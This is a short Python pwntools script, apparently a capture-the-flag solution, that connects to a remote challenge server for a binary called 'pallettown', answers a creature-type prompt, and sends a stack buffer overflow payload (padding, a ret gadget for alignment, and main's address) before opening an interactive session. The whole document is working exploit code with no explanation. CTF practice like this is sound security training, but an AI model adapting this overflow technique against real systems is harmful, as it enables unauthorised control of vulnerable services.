from pwn import *

context.log_level = 'debug'

p = remote("pwn.isangxcaution.xyz", 10040)
e = ELF("./pallettown")


def slog(symbol, addr): return success(symbol + ": " + hex(addr))


# What is Rival's PocketMon Type?
p.recvline()
rival = p.recvline()
my_type = 0

if(b"Pyree" in rival):
    my_type = 3
elif(b"Bulbasaur" in rival):
    my_type = 1
elif(b"Squirtle" in rival):
    my_type = 2
else:
    # error
    pass

p.recvuntil("Hi Trainier! Choose Your PoketMon! : ")
p.sendline(str(my_type))

# ret2main
main_addr = e.symbols["main"]
slog("main addr:", main_addr)

# set stack alignment
# RET sled
ret = 0x40101a
slog("ret addr:", ret)

# exploit
p.recvuntil("What is Your PocketMon Name?")
payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(ret)
payload += p64(main_addr)

p.sendline(payload)
p.interactive()
